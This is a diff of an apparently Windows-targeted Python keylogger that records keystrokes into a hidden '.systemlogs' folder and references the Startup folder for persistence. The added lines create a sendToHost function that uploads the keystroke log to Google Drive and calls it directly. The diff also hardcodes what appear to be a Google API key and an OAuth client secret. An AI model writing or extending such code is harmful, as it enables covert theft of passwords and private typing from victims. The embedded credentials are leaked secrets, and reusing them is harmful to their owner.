@@ -3,13 +3,15 @@ import time
 import os
 import uuid
 import threading
-
-
+from pydrive.auth import GoogleAuth
+from pydrive.drive import GoogleDrive
+# api key = AIzaSyAQoZFWE3ey9XAvKLwtOPe-jKFhx-hbv7A
 ##C:\Users\Owner\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 
 ROOT = 'C:\\Users\\Owner\\.systemlogs\\'
-LOG = str(uuid.uuid4().hex)+'.txt'
+# LOG = str(uuid.uuid4().hex)+'.txt'
+LOG = 'fa336456bdb14e98bd47a84cfbdb6b87.txt'
 KEY = keyboard.Key
 STROKE = False
 BANNER = True
@@ -17,6 +19,15 @@ if not os.path.exists(ROOT):
     os.mkdir(ROOT)
 
 
+
+
+def sendToHost():
+    gauth = GoogleAuth()
+    drive = GoogleDrive(gauth)
+    gfile = drive.CreateFile({'parents': [{'id': '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'}]})
+    gfile.SetContentFile(os.path.join(ROOT,LOG))
+    gfile.Upload()
+    
 def on_press(key):
     pass
 
@@ -56,5 +67,7 @@ def Timer():
 
 thread1 = threading.Thread(target=Logger)
 thread2 = threading.Thread(target=Timer)
-thread1.start()
-thread2.start()
+# thread1.start()
+# thread2.start()
+
+sendToHost()
